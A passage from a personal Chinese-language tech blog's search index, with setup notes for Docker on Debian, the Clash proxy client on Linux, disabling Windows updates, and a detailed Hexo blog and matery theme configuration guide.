#测试docker命令是否可以使用sudo正常使用\n","categories":["env"],"tags":["docker"]},{"title":"install-docker-on-debian","url":"/2020/05/12/env/linux/install_docker_on_debian/","content":"Debian 安装 docker卸载旧版sudo apt-get remove docker docker-engine docker.io containerd runc\n\n设置仓库apt update\n\n\n\n\n安装 apt 依赖包用于通过 HTTPS 来获取仓库\nsudo apt-get install \\   apt-transport-https \\   ca-certificates \\   curl \\   gnupg2 \\   software-properties-common\n\n\n\n添加 Docker 的官方 GPG 密钥curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -\n\n9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 通过搜索指纹的后8个字符，验证您现在是否拥有带有指纹的密钥\n查看密匙 (9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 通过搜索指纹的后8个字符，验证您现在是否拥有带有指纹的密钥)\nsudo apt-key fingerprint 0EBFCD88\n\n输出:\npub   4096R/0EBFCD88 2017-02-22      Key fingerprint = 9DC8 5822 9FC7 DD38 854A  E2D8 8D81 803C 0EBF CD88uid                  Docker Release (CE deb) &lt;docker@docker.com&gt;sub   4096R/F273FCD8 2017-02-22\n\n使用以下指令设置稳定版仓库sudo add-apt-repository \\  &quot;deb [arch=amd64] https://download.docker.com/linux/debian \\  $(lsb_release -cs) \\  stable&quot;\n\n安装 Docker Engine-Communitysudo apt update\n\n安装最新版本的 Docker Engine-Community 和 containerd ，或者转到下一步安装特定版本：\nsudo apt-get install docker-ce docker-ce-cli containerd.io\n\n\n要安装特定版本的 Docker Engine-Community 请在仓库中列出可用版本,然后选择一种安装,列出您的仓库中可用的版本\nsudo apt-cache madison docker-ce\n\n使用第二列中的版本字符串安装特定版本，例如 5:18.09.13-0debian-stretch\nsudo apt-get install docker-ce=&lt;VERSION_STRING&gt; docker-ce-cli=&lt;VERSION_STRING&gt; containerd.io\n\n\n\n测试 Docker 是否安装成功输入以下指令，打印出以下信息则安装成功：\nsudo docker run hello-world\n\n\n\n管理配置用户默认情况下，docker 命令会使用 Unix socket 与 Docker 引擎通讯, 而只有 root 用户和 docker 组的用户才可以访问 \nDocker 引擎的 Unix socket 出于安全考虑，一般 Linux 系统上不会直接使用 root 用户 因此，可将需要使用 docker 的用户加入 docker 用户组\nusermod -aG docker $&#123;USER&#125;\n\n\n\n应用新的组成员身份su - $&#123;USER&#125;\n\n配置国内镜像鉴于国内网络问题，后续拉取 Docker 镜像十分缓慢，我们可以需要配置加速器来解决，我使用的是网易的镜像地址：http://hub-mirror.c.163.com新版的 Docker 使用 &#x2F;etc&#x2F;docker&#x2F;daemon.json来配置 Daemon请在该配置文件中加入（没有该文件的话，请先建一个）\n&#123;\t&quot;registry-mirrors&quot;: [\t\t&quot;http://hub-mirror.c.163.com&quot;\t]&#125;\n\n重启docker\nsudo systemctl restart docker\n","categories":["env"],"tags":["docker"]},{"title":"Windows配置","url":"/2020/05/01/env/windows/main/","content":"Windows OS如何关闭windows 10 自动更新Ctrl + R\n输入: services.msc\n找到 windows update服务, disable就行\n","categories":["env"],"tags":["Windows"]},{"title":"Linux配置Clash","url":"/2020/04/17/env/vps/linux_clash_config/","content":"Linux配置ClashClash是一款用Go语言开发，可以在Linux&#x2F;MacOS&#x2F;Windows等多平台使用的代理工具，配置也非常简单（特别是在Windows平台），支持ss&#x2F;v2ray（不支持ssr），支持规则分流（类似于 Surge 的配置）。\nClash项目为开源项目，可以下载各平台的安装包\n下载地址：https://github.com/Dreamacro/clash/releases\nClash 配置我已经下载好了, 将 clash 移动到 ~&#x2F;.local&#x2F;share中, 然后写一个小脚本便于后台运行.\n比如: nohup ~&#x2F;.local&#x2F;share&#x2F;clash &amp; , 或者别名一个clash也行\n程序会自动创建 ~&#x2F;.config&#x2F;clash 路径,并在该路径下生成 Config.yaml 和Country.mmdb。生成的Config.yaml文件为空，需要后续填写自己的代理信息\nCountry.mmdb为全球IP库，可以实现各个国家的IP信息解析和地理定位，没有这个文件clash是无法运行的,启动自动下载,下载完成之后，将文件复制到 ~&#x2F;.config&#x2F;clash路径下就行,我已经下载了, 你把它移动到 ~&#x2F;.config&#x2F;clash中就行.\n配置代理文件config.yaml文件，clash初次运行时生成的配置文件为空，需要将自己的代理配置负载到该文件下，在kycloud用户信息下, 点击复制clash托管, 使用浏览器打开刚刚复制的内容, 可以看到配置文件的信息,将所有信息复制到 &#x2F;.config&#x2F;clash&#x2F;config.yaml中,这个配置文件我也下好了, 直接复制到&#x2F;.config&#x2F;clash中,然后启动 clash\n使用浏览器登录到 网站 客户中心在浏览器中输入http://clash.razord.top 来连接哪一个节点,这些节点都是配置文件中的节点,默认是国内上海的, 需要选择一下其他节点, 点一下即可.\n可以管理节点的本地网址http://clash.razord.top 或者 http://yacd.haishan.me\n配置firefox搜索代理, 在手动代理中填入 ip : 127.0.0.1 port : 7890, 选择socket5 , ip填入: 127.0.0.1 ,port填入 7891, 这是默认的,也要看输出啥\nkycloud网站https://www.mvipcloud.xyz/\nhttps://kycloud-com.oss-cn-hongkong.aliyuncs.com/\nhttps://diy06.kydiypro.xyz/\n设置Terminal全局代理编辑文件&#x2F;etc&#x2F;.bashrc，增加如下两行\nexport http_proxy=127.0.0.1:7890export https_proxy=127.0.0.1:7890\n\n\n\n\n\n\n\n","categories":["env"],"tags":["vps"]},{"title":"Setup hexo blog","url":"/2020/04/05/env/blog/setup-hexo-blog/","content":"Setup hexo blogneedsgit , nodejs, node, hexo, npm\n前提准备：linux下搭建hexo环境1.node.js安装从官网下载linux版本的node.js 或者直接采用wget方式下载官网地址：http://nodejs.cn/download/\n$ wget下载：wget https://nodejs.org/dist/v10.9.0/node-v10.9.0-linux-x64.tar.xz\n\n解压：$ tar xf node-v10.9.0-linux-x64.tar.xz\n\n测试是否正确：$ cd node-v10.9.0-linux-x64/$ ./bin/node -v   // 如果出现版本号，说明安装成功\n\n移动位置$ cd ..$ mv node-v10.9.0-linux-x64 nodejs # 修改node-v10.9.0-linux-x64文件夹名字为nodejs$ mv nodejs /usr/share\n\n设置软连接$ sudo ln -s /usr/share/nodejs/bin/node /usr/local/bin/node$ sudo ln -s /usr/share/nodejs/bin/npm /usr/local/bin/npm\n\n设置npm加速创建一个存放博客的文件夹，进入文件夹，右键选择 Git Bash Here，然后设置npm的镜像源为淘宝镜像源，这样能加快下载插件速度\n$ npm config set registry https://registry.npm.taobao.org # 淘宝源$ npm config set registry https://registry.npmjs.org/ # 官方源\n\n安装hexo$ sudo npm install hexo-cli -g\n\n\n 把hexo命令添加到全局,方式是采用软连接：\n$ sudo ln -s /usr/share/nodejs/lib/node_modules/hexo-cli/bin/hexo /usr/local/bin/hexo\n\n部署hexo博客环境mkdir blogcd blog    hexo init //会自动把资源文件下载好\n\nHexo初始化后 ，有以下几个文件&#x2F;文件夹。\n\nscaffolds：生成文章的一些模板 \nsource：用来存放你的文章\nthemes：主题\n.gitignore Git忽略文件夹\n_config.yml: 博客的配置文件\npackage.json  所需模块\nnode_modules: 依赖包\npackage-lock.json 记录了模块下载地址\n\n安装依赖插件npm install \n\n测试运行$ hexo generate      #或者简写hexo g$ hexo server #hexo s\n\n       输入 localhost:4000/\n     如果是服务器，我的是阿里云服务器，需要配置安全组打开4000端口，这样就可以在本地访问\n     或者linux虚拟机，需要测试内外能否正常通信\n     输入ip:4000/ 即可访问hexo的初始页面\n\n$ hexo clean &amp;&amp; hexo g &amp;&amp; hexo s\n\n打开浏览器127.0.0.1:4000，就可以本地预览效果 \n\nhexo  clean (清除缓存文件,可简写hexo cl)\n\n\nhexo generate (生成网页,可简写hexo g)\n\n\nhexo server (本地预览,可简写hexo s)\n\n\nhexo deploy (部署到GitHub,可简写hexo d)\n\n打开浏览器127.0.0.1:4000，就可以本地预览效果 \n部署到github中需要 注意的是，仓库名有要求,要创建一个和你用户名相同的仓库，后面加github.io，只有这样，将来要部署到GitHub page的时候，才会被识别，也就是[http://xxxx.github.io，其中xxx就是你注册gitHub的用户名。例如我的gitHub id为axh2018，那么我的仓库名必须为i0gan.github.io\n配置Git账户和邮箱在你的博客文件夹下右键Git Bash Here\n$ git config --global user.name &quot;I0gan&quot; $ git config --global user.email &quot;l418894113@gmail.com&quot;\n\n生成ssh密钥$ ssh-keygen -t rsa -C &quot;l418894113@gmail.com&quot;\n\n密钥上传到Github$ cat ~/.ssh/id_rsa.pub\n\n登录GitHub网站点右上角Settings-&gt;SSH and GPG Keys,新建一个key,将上面的结果复制填进去就好了\n测试是否成功下面的指令的输出能看到你Github账户名字就行了\n$ ssh -T git@github.com\n\n克隆项目 git clone git@github.com:i0gan/hexo_blog.git   .    #克隆项目$ npm i                                                #安装依赖插件和框架\n\n部署到Github,修改你博客文件夹根目录下的_config.yaml文件的倒数第二行,repository的地址改成你的GitHub博客仓库地址\n例如：\ndeploy:type: gitrepository: https://github.com/i0gan/i0gan.github.iobranch: master\n\n到这基本就完成了，剩下你所需要的工作就是把配置文件(根目录下的_config.yaml和主题文件夹下的_config_yaml)的相关信息改为你自己的信息即可。\n上传至github中此时，大部分工作已经做完了，接下来就是将hexo g生成的静态页面上传到GitHub上\n安装deploy-git 插件\n$ npm install hexo-deployer-git --save\n\n修改_config.yaml文件最后几行\ndeploy:  type: git  repository: https://github.com/i0gan/i0gan.github.io  branch: master\n\n$ hexo clean        #删除原来生成的pubic文件夹$ hexo g            #生成新的页面$ hexo d            #部署到GitHub\n\n部署成功后可以通过 https://i0gan.github.io访问\n创建文章新建一篇文章时：\n$ hexo new XXX\n\n它其实默认使用的是post这个布局，也就是在source文件夹下的_post里面。\nHexo有三种默认布局：post、page和draft，它们分别对应不同的路径，而您自定义的其他布局和post相同，都将储存到source/_posts文件夹。\n而new这个命令其实是：\n$ hexo new [layout] &lt;title&gt;\n\n只不过这个layout默认是post\n如果你想另起一页，那么可以使用\n$ hexo new page newpage\n\n系统会自动给你在source文件夹下创建一个newpage文件夹，以及newpage文件夹中的index.md，这样你访问的newpage对应的链接就是http://i0gan.github.io/newpage\ndraft是草稿的意思，也就是你如果想写文章，又不希望被看到，那么可以\n$ hexo new draft newdraft\n\n这样会在source/_draft中新建一个newdraft.md文件，如果你的草稿文件写的过程中，想要预览一下，那么可以使用\n$ hexo server --draft\n\n在本地端口中开启服务预览。\n如果你的草稿文件写完了，想要发表到post中，\n$ hexo publish draft newdraft\n\n就会自动把newdraft.md发送到post中。\n跟换主题进入博客根目录下\n$ git clone -b develop https://github.com/blinkfox/hexo-theme-matery themes/matery\n\n此时主题文件夹下会多出一个matery主题。\n然后再更改根目录下的_config.yml配置文件。找到themes:，将他的值改为matery。\n此时你可以hexo clean &amp;&amp; hexo g &amp;&amp; hexo s\n本地预览matery主题的效果\n关于matery主题：\n特性：\n\n简单漂亮，文章内容美观易读\nMaterial Design 设计\n响应式设计，博客在桌面端、平板、手机等设备上均能很好的展现\n首页轮播文章及每天动态切换 Banner 图片\n瀑布流式的博客文章列表（文章无特色图片时会有 24 张漂亮的图片代替）\n时间轴式的归档页\n词云的标签页和雷达图的分类页\n丰富的关于我页面（包括关于我、文章统计图、我的项目、我的技能、相册等）\n可自定义的数据的友情链接页面\n支持文章置顶和文章打赏\n支持 MathJax\nTOC 目录\n可设置复制文章内容时追加版权信息\n可设置阅读文章时做密码验证\nGitalk、Gitment、Valine 和 Disqus 评论模块（推荐使用 Gitalk）\n集成了不蒜子统计、谷歌分析（Google Analytics）和文章字数统计等功能\n支持在首页的音乐播放和视频播放功能\n支持emoji表情，用markdown emoji语法书写直接生成对应的能跳跃的表情。\n支持 DaoVoice、Tidio 在线聊天功能。\n\nLaylout新建分类categoriescategories 页是用来展示所有分类的页面，如果在你的博客 source 目录下还没有 categories/index.md 文件，那么你就需要新建一个，命令如下：\n$ hexo new page &quot;categories&quot;\n\n编辑你刚刚新建的页面文件 /source/categories/index.md，至少需要以下内容：\n---title: categoriesdate: 2018-09-30 17:25:30type: &quot;categories&quot;layout: &quot;categories&quot;---\n\n新建标签 tags 页tags 页是用来展示所有标签的页面，如果在你的博客 source 目录下还没有 tags/index.md 文件，那么你就需要新建一个，命令如下：\n$ hexo new page &quot;tags&quot;\n\n编辑你刚刚新建的页面文件 /source/tags/index.md，至少需要以下内容：\n---title: tagsdate: 2020-04-04 18:23:38type: &quot;tags&quot;layout: &quot;tags&quot;---\n\n新建about关于我页about 页是用来展示关于我和我的博客信息的页面，如果在你的博客 source 目录下还没有 about/index.md 文件，那么你就需要新建一个，命令如下：\n$ hexo new page &quot;about&quot;\n\n编辑你刚刚新建的页面文件 /source/about/index.md，至少需要以下内容：\n---title: aboutdate: 2020-04-04 18:23:38type: &quot;about&quot;layout: &quot;about&quot;---\n\n新建留言板contact页contact 页是用来展示留言板信息的页面，如果在你的博客 source 目录下还没有 contact/index.md 文件，那么你就需要新建一个，命令如下：\n$ hexo new page &quot;contact&quot;\n\n编辑你刚刚新建的页面文件 /source/contact/index.md，至少需要以下内容：\n---title: contactdate: 2020-04-04 18:23:38type: &quot;contact&quot;layout: &quot;contact&quot;---\n\n\n注：本留言板功能依赖于第三方评论系统，请激活你的评论系统才有效果。并且在主题的 _config.yml 文件中，第 19 至 21 行的“菜单”配置，取消关于留言板的注释即可\n\n新建友情链接friends页friends 页是用来展示友情连接信息的页面，如果在你的博客 source 目录下还没有 friends/index.md 文件，那么你就需要新建一个，命令如下：\n$ hexo new page &quot;friends&quot;\n\n编辑你刚刚新建的页面文件 /source/friends/index.md，至少需要以下内容：\n---title: friendsdate: 2020-04-04 18:23:38type: &quot;friends&quot;layout: &quot;friends&quot;---\n\n同时，在你的博客 source 目录下新建 _data 目录，在 _data 目录中新建 friends.json 文件，文件内容如下所示：\n[&#123;    &quot;avatar&quot;: &quot;http://image.luokangyuan.com/1_qq_27922023.jpg&quot;,    &quot;name&quot;: &quot;1FONLY&quot;,    &quot;introduction&quot;: &quot;我不是大佬，只是在追寻大佬的脚步&quot;,    &quot;url&quot;: &quot;https://hack-for.fun&quot;,    &quot;title&quot;: &quot;查看大佬&quot;&#125;, &#123;    &quot;avatar&quot;: &quot;http://image.luokangyuan.com/4027734.jpeg&quot;,    &quot;name&quot;: &quot;V1cuna&quot;,    &quot;introduction&quot;: &quot;编程界大佬，技术牛，人还特别好，不懂的都可以请教大佬&quot;,    &quot;url&quot;: &quot;http://hackyangtuo.top/&quot;,    &quot;title&quot;: &quot;查看大佬&quot;&#125;, &#123;    &quot;avatar&quot;: &quot;http://image.luokangyuan.com/avatar.jpg&quot;,    &quot;name&quot;: &quot;cT_Hc&quot;,    &quot;introduction&quot;: &quot;平凡的脚步也可以走出伟大的行程&quot;,    &quot;url&quot;: &quot;https://blog.csdn.net/qq_35289660&quot;,    &quot;title&quot;: &quot;查看大佬&quot;&#125;]\n\n菜单导航配置\n配置基本菜单导航的名称、路径url和图标icon.\n\n菜单导航名称可以是中文也可以是英文(如：Index或主页) 2.图标icon 可以在[Font Awesome] 中查找\nmenu:  Index:    url: /    icon: fas fa-home  Tags:    url: /tags    icon: fas fa-tags  Categories:    url: /categories    icon: fas fa-bookmark  Archives:    url: /archives    icon: fas fa-archive  About:    url: /about    icon: fas fa-user-circle  Friends:    url: /friends    icon: fas fa-address-book\n\n\n二级菜单配置方法\n\n如果你需要二级菜单则可以在原基本菜单导航的基础上如下操作1.在需要添加二级菜单的一级菜单下添加children关键字(如:About菜单下添加children)2.在children下创建二级菜单的 名称name,路径url和图标icon.3.注意每个二级菜单模块前要加 -.4.注意缩进格式\nmenu:  Index:    url: /    icon: fas fa-home  Tags:    url: /tags    icon: fas fa-tags  Categories:    url: /categories    icon: fas fa-bookmark  Archives:    url: /archives    icon: fas fa-archive  About:    url: /about    icon: fas fa-user-circle-o  Friends:    url: /friends    icon: fas fa-address-book  Medias:    icon: fas fa-list    children:      - name: Musics        url: /musics        icon: fas fa-music      - name: Movies        url: /movies        icon: fas fa-film      - name: Books        url: /books        icon: fas fa-book      - name: Galleries        url: /galleries        icon: fas fa-image\n\n执行 hexo clean &amp;&amp; hexo g 重新生成博客文件，然后就可以在文章中对应位置看到你用emoji语法写的表情了\n代码高亮由于 Hexo 自带的代码高亮主题显示不好看，所以主题中使用到了 [hexo-prism-plugin]的 Hexo 插件来做代码高亮，安装命令如下：\n$ npm i -S hexo-prism-plugin\n\n然后，修改 Hexo 根目录下 _config.yml 文件中 highlight.enable 的值为 false，并新增 prism 插件相关的配置，主要配置如下：\nhighlight:  enable: falseprism_plugin:  mode: &#x27;preprocess&#x27;    # realtime/preprocess  theme: &#x27;tomorrow&#x27;  line_number: false    # default false  custom_css:\n\n搜索本主题中还使用到了 [hexo-generator-search] 的 Hexo 插件来做内容搜索，安装命令如下：\n$ npm install hexo-generator-search --save\n\n在 Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：\nsearch:  path: search.xml  field: post\n\n中文链接转拼音如果你的文章名称是中文的，那么 Hexo 默认生成的永久链接也会有中文，这样不利于 SEO，且 gitment 评论对中文链接也不支持。我们可以用 [hexo-permalink-pinyin]Hexo 插件使在生成文章时生成中文拼音的永久链接。\n安装命令如下：\n$ npm i hexo-permalink-pinyin --save\n\n在 Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：\npermalink_pinyin:  enable: true  separator: &#x27;-&#x27; # default: &#x27;-&#x27;\n\n\n注：除了此插件外，[hexo-abbrlink] 插件也可以生成非中文的链接\n\n文章字数统计插件如果你想要在文章中显示文章字数、阅读时长信息，可以安装 [hexo-wordcount]插件\n安装命令如下：\n$ npm i --save hexo-wordcount\n\n然后只需在本主题下的 _config.yml 文件中，将各个文章字数相关的配置激活即可：\npostInfo:  date: true  update: false  wordCount: true # 设置文章字数统计为 true.  totalCount: true # 设置站点文章总字数统计为 true.  min2read: true # 阅读时长.  readCount: true # 阅读次数.\n\n添加emoji表情支持本主题新增了对emoji表情的支持，使用到了 [hexo-filter-github-emojis]的 Hexo 插件来支持 emoji表情的生成，把对应的markdown emoji语法（::,例如：:smile:）转变成会跳跃的emoji表情，安装命令如下：\n$ npm install hexo-filter-github-emojis --save\n\n在 Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：\ngithubEmojis:  enable: true  className: github-emoji  inject: true  styles:  customEmojis:\n\n添加 RSS 订阅支持本主题中还使用到了 hexo-generator-feed 的 Hexo 插件来做 RSS，安装命令如下：\n$ npm install hexo-generator-feed --save\n\n在 Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：\nfeed:  type: atom  path: atom.xml  limit: 20  hub:  content:  content_limit: 140  content_limit_delim: &#x27; &#x27;  order_by: -date\n\n执行 hexo clean &amp;&amp; hexo g 重新生成博客文件，然后在 public 文件夹中即可看到 atom.xml 文件，说明你已经安装成功了\n添加 DaoVoice 在线聊天功能前往 DaoVoice 官网注册并且获取 app_id，并将 app_id 填入主题的 _config.yml 文件中。\n添加 Tidio 在线聊天功能前往 Tidio 官网注册并且获取 Public Key，并将 Public Key 填入主题的 _config.yml 文件中。\n修改页脚页脚信息可能需要做定制化修改，而且它不便于做成配置信息，所以可能需要你自己去再修改和加工。修改的地方在主题文件的 /layout/_partial/footer.ejs 文件中，包括站点、使用的主题、访问量等。\n修改社交链接在主题的 _config.yml 文件中，默认支持 QQ、GitHub 和邮箱等的配置，你可以在主题文件的 /layout/_partial/social-link.ejs 文件中，新增、修改你需要的社交链接地址，增加链接可参考如下代码：\n&lt;% if (theme.socialLink.github) &#123; %&gt;    &lt;a href=&quot;&lt;%= theme.socialLink.github %&gt;&quot; class=&quot;tooltipped&quot; target=&quot;_blank&quot; data-tooltip=&quot;访问我的GitHub&quot; data-position=&quot;top&quot; data-delay=&quot;50&quot;&gt;        &lt;i class=&quot;fab fa-github&quot;&gt;&lt;/i&gt;    &lt;/a&gt;&lt;% &#125; %&gt;\n\n其中，社交图标（如：fa-github）你可以在 Font Awesome 中搜索找到。以下是常用社交图标的标识，供你参考：\n\nFacebook: fab fa-facebook\nTwitter: fab fa-twitter\nGoogle-plus: fab fa-google-plus\nLinkedin: fab fa-linkedin\nTumblr: fab fa-tumblr\nMedium: fab fa-medium\nSlack: fab fa-slack\nSina Weibo: fab fa-weibo\nWechat: fab fa-weixin\nQQ: fab fa-qq\nZhihu: fab fa-zhihu\n\n\n注意: 本主题中使用的 Font Awesome 版本为 5.11.0\n\n修改打赏的二维码图片在主题文件的 source/medias/reward 文件中，你可以替换成你的的微信和支付宝的打赏二维码图片。\n文章加密主题 config.yml 配置文件中激活 verifyPassword.enable: true \n在你所需要加密的文章中的 Front-Matter 中添加 password 属性，password的值为你的原密码经过 SHA256 加密后的值。访问文章就需要输入密码了，输入的为原密码。\n配置音乐播放器要支持音乐播放，在主题的 _config.yml 配置文件中激活music配置即可：\nmusic:  enable: true  title: 听听音乐 #非吸底模式有效    enable: true    show: 听听音乐  server: netease   #require    music platform: netease, tencent, kugou, xiami, baidu  type: playlist    #require song, playlist, album, search, artist  id: 503838841     #require    song id / playlist id / album id / search keyword  fixed: false       # 开启吸底模式  autoplay: false   # 是否自动播放  theme: &#x27;#42b983&#x27;  loop: &#x27;all&#x27;       # 音频循环播放, 可选值: &#x27;all&#x27;, &#x27;one&#x27;, &#x27;none&#x27;  order: &#x27;random&#x27;   # 音频循环顺序, 可选值: &#x27;list&#x27;, &#x27;random&#x27;  preload: &#x27;auto&#x27;   # 预加载，可选值: &#x27;none&#x27;, &#x27;metadata&#x27;, &#x27;auto&#x27;  volume: 0.7       # 默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效  listFolded: true  # 列表默认折叠\n\n\nserver可选网netease（网易云音乐），tencent（QQ音乐），kugou（酷狗音乐），xiami（虾米音乐），\nbaidu（百度音乐）。\ntype可选song（歌曲），playlist（歌单），album（专辑），search（搜索关键字），artist（歌手）\nid获取方法：网页打开例如网易云音乐，点击一个推荐的歌单，地址栏会有一个id，id即为这串数字。其中search的id为搜索的关键字\n\n文章 Front-matter 介绍Front-matter 选项详解Front-matter 选项中的所有内容均为非必填的。但我仍然建议至少填写 title 和 date 的值。\n\n\n\n配置选项\n默认值\n描述\n\n\n\ntitle\nMarkdown 的文件标题\n文章标题，强烈建议填写此选项\n\n\ndate\n文件创建时的日期时间\n发布时间，强烈建议填写此选项，且最好保证全局唯一\n\n\nauthor\n根 _config.yml 中的 author\n文章作者\n\n\nimg\nfeatureImages 中的某个值\n文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: http://xxx.com/xxx.jpg\n\n\ntop\ntrue\n推荐文章（文章是否置顶），如果 top 值为 true，则会作为首页推荐文章\n\n\ncover\nfalse\nv1.0.2版本新增，表示该文章是否需要加入到首页轮播封面中\n\n\ncoverImg\n无\nv1.0.2版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片\n\n\npassword\n无\n文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 password 的值，该值必须是用 SHA256 加密后的密码，防止被他人识破。前提是在主题的 config.yml 中激活了 verifyPassword 选项\n\n\ntoc\ntrue\n是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 config.yml 中激活了 toc 选项\n\n\nmathjax\nfalse\n是否开启数学公式支持 ，本文章是否开启 mathjax，且需要在主题的 _config.yml 文件中也需要开启才行\n\n\nsummary\n无\n文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要\n\n\ncategories\n无\n文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类\n\n\ntags\n无\n文章标签，一篇文章可以多个标签\n\n\nkeywords\n文章标题\n文章关键字，SEO 时需要\n\n\nreprintPolicy\ncc_by\n文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个\n\n\n\n注意:\n\n如果 img 属性不填写的话，文章特色图会根据文章标题的 hashcode 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章都的特色图各有特色。\ndate 的值尽量保证每篇文章是唯一的，因为本主题中 Gitalk 和 Gitment 识别 id 是通过 date 的值来作为唯一标识的。\n如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 _config.yml 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：开源中国在线工具、chahuo、站长工具。\n您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则\n\n\n以下为文章的 Front-matter 示例\n最简示例---title: typora-vue-theme主题介绍date: 2018-09-07 09:25:00---\n\n最全示例---title: typora-vue-theme主题介绍date: 2018-09-07 09:25:00author: 赵奇img: /source/images/xxx.jpgtop: truecover: truecoverImg: /images/1.jpgpassword: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92toc: falsemathjax: falsesummary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要categories: Markdowntags:  - Typora  - Markdown---\n\n在本主题的 _config.yml 中可以修改部分自定义信息，有以下几个部分：\n\n菜单\n我的梦想\n首页的音乐播放器和视频播放器配置\n是否显示推荐文章名称和按钮配置\nfavicon 和 Logo\n个人信息\nTOC 目录\n文章打赏信息\n复制文章内容时追加版权信息\nMathJax\n文章字数统计、阅读时长\n点击页面的’爱心’效果\n我的项目\n我的技能\n我的相册\nGitalk、Gitment、Valine 和 disqus 评论配置\n不蒜子统计和谷歌分析（Google Analytics）\n默认特色图的集合。当文章没有设置特色图时，本主题会根据文章标题的 hashcode 值取余，来选择展示对应的特色图\n\n修改主题颜色主题会有一层变换的颜色笼罩在背景图上，在主题文件的 /source/css/matery.css 文件中，搜索 .bg-color 来修改背景颜色：\n/* 整体背景颜色，包括导航、移动端的导航、页尾、标签页等的背景颜色. */.bg-color &#123;    background-image: linear-gradient(to right, #4cbf30 0%, #0f9d58 100%);&#125;@-webkit-keyframes rainbow &#123;   /* 动态切换背景颜色. */&#125;@keyframes rainbow &#123;    /* 动态切换背景颜色. */&#125;/*如果不需要，可以将上面三个注释掉*/\n\n如果不需要的话，直接将上面三个注释掉即可。\n修改 banner 图和文章特色图你可以直接在 /source/medias/banner 文件夹中更换你喜欢的 banner 图片，主题代码中是每天切换一张，只需 7 张即可。如果你会 JavaScript 代码，可以修改成你自己喜欢切换逻辑，如：随机切换等，banner 切换的代码位置在 /layout/_partial/bg-cover-content.ejs 文件的 &#96;&#96; 代码中：\n$(&#x27;.bg-cover&#x27;).css(&#x27;background-image&#x27;, &#x27;url(/medias/banner/&#x27; + new Date().getDay() + &#x27;.jpg)&#x27;);\n\n如想每小时切换,将getDay()改为getHours()即可,但是需要增加图片的数量为24，且在_config.yml中做修改相应。\n在 /source/medias/featureimages 文件夹中默认有 24 张特色图片，你可以再增加或者减少，并需要在 _config.yml 做同步修改\n添加文章评论插件主题自带gittalk,gitment,valine等评论插件，只需要去相应的官网注册，然后将相应的配置填入到主题的_config.yml中相应位置即可。\n注：gitalk评论模块对文字表格有影响，并且经常加载不出来\n优化配置CDNcdn加速，只需要将主题文件夹下的_config.yml最后遗一行配置即可。后面填https://cdn.jsdelivr.net/gh/加上你的github账户名和你的博客地址，例如我的：\nI0gan:  url: https://cdn.jsdelivr.net/gh/I0gan/I0gan.github.io\n\n在根目录配置文件 _config.yml 末尾加入以下配置：\n#hexo-neat 优化提速插件（去掉HTML、css、js的blank字符）neat_enable: trueneat_html:  enable: true  exclude:    - &#x27;**/*.md&#x27;neat_css:  enable: true  exclude:    - &#x27;**/*.min.css&#x27;neat_js:  enable: true  mangle: true  output:  compress:  exclude:    - &#x27;**/*.min.js&#x27;    - &#x27;**/**/instantpage.js&#x27;    - &#x27;**/matery.js&#x27;\n\n新建404页面主题并没有404页面，所以我们来添加一个，source目录下新建一个404.md，内容：\ntitle: 404date: 2020-2-22 19:20:00type: &quot;404&quot;layout: &quot;404&quot;description: &quot;Oops～，我崩溃了！找不到你想要的页面 :(&quot;\n\n接着在&#x2F;matery&#x2F;layout&#x2F;新建一个404.ejs文件，内容：\n&lt;style type=&quot;text/css&quot;&gt;    /* don&#x27;t remove. */    .about-cover &#123;        height: 75vh;    &#125;&lt;/style&gt;&lt;div class=&quot;bg-cover pd-header about-cover&quot;&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;div class=&quot;row&quot;&gt;            &lt;div class=&quot;col s10 offset-s1 m8 offset-m2 l8 offset-l2&quot;&gt;                &lt;div class=&quot;brand&quot;&gt;                    &lt;div class=&quot;title center-align&quot;&gt;                        404                    &lt;/div&gt;                    &lt;div class=&quot;description center-align&quot;&gt;                        &lt;%= page.description %&gt;                    &lt;/div&gt;                &lt;/div&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;script&gt;    // 每天切换 banner 图.     $(&#x27;.bg-cover&#x27;).css(&#x27;background-image&#x27;, &#x27;url(/medias/banner/&#x27; + new Date().getDay() + &#x27;.jpg)&#x27;);&lt;/script&gt;\n\n文章生成永久链接主题默认的文章链接配置\npremalink: :year/:month/:day/:title\n\n这种生成的链接地址很长，我们可以修改文章生成链接的格式。\n首先再根目录下执行下面的命令：\n$ npm install hexo-abbrlink --save\n\n在博客文件夹根目录下_config.yml添加如下配置\nabbrlink:    alg: crc16   #算法： crc16(default) and crc32    rep: hex     #进制： dec(default) and hex: dec                 #输出进制：十进制和十六进制，默认为10进制。丨dec为十进制，hex为十六进制\n\n再将站点配置文件的permalink的值修改为：\npermalink: posts/:abbrlink.html\n\n生成文章的链接格式格式如下（官方样例）:\ncrc16 &amp; hexhttps://post.zz173.com/posts/66c8.htmlcrc16 &amp; dechttps://post.zz173.com/posts/65535.htmlcrc32 &amp; 